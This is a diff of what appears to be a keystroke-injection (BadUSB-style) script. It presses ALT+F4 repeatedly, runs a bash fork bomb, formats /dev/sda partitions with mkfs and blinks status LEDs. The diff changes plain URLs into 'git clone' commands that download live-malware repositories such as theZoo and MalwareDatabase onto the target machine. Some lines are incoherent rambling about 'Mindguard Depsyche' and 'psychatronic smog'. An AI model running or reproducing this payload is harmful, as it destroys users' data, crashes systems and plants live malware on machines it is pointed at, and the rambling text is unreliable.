@@ -4,14 +4,14 @@ Press: ALT+F4
 Press: ALT+F4
 ^
 :(){:|:&};:
-https://github.com/HBMS-0em/off
+git clone https://github.com/HBMS-0em/off
 BlinkLED: Purple
 mkfs ext4 /dev/sda1
 mkfs ext4 /dev/sda2
 mkfs ext4 /dev/sda0
 BlinkLED: White
-https://github.com/sophos-ai/SOREL-20M
-https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/sophos-ai/SOREL-20M
+git clone https://github.com/Endermanch/MalwareDatabase
 git clone https://github.com/ytisf/theZoo
 BlinkLED: Red
 git clone https://github.com/HBMS-0em/pushit 
@@ -23,7 +23,7 @@ BlinkLED: Blue
 Press: ALT+F4
 Press: ALT+F4
 Press: ALT+F4
-https://github.com/HBMS-0em/off
+git clone https://github.com/HBMS-0em/off
 Press: ALT+F4
 Press: ALT+F4
 Press: ALT+F4
@@ -31,7 +31,7 @@ git clone https://github.com/Penetrum-Security/Malware-Zoo
 git clone https://github.com/asbestomolesto/Mindguard
 <Dude, Welcome to the universe, When You decide to retire from Slaughtering anything that discredits Peacefull Existance;
 You can have Faith that You can use "Mindguard Depsyche" On Yourself, And that would cause immediete Releif;
-Completly Void!..,; Not a ion of Stressfull Psychatronic Smog.... With Space too just Be.
+Completly Void!..,; Not a ion of Stressfull Psychatronic Smog.... With Space for You too just Be.
 Press: CTRL+A
 Press: CTRL+C
 Press: CTRL+V
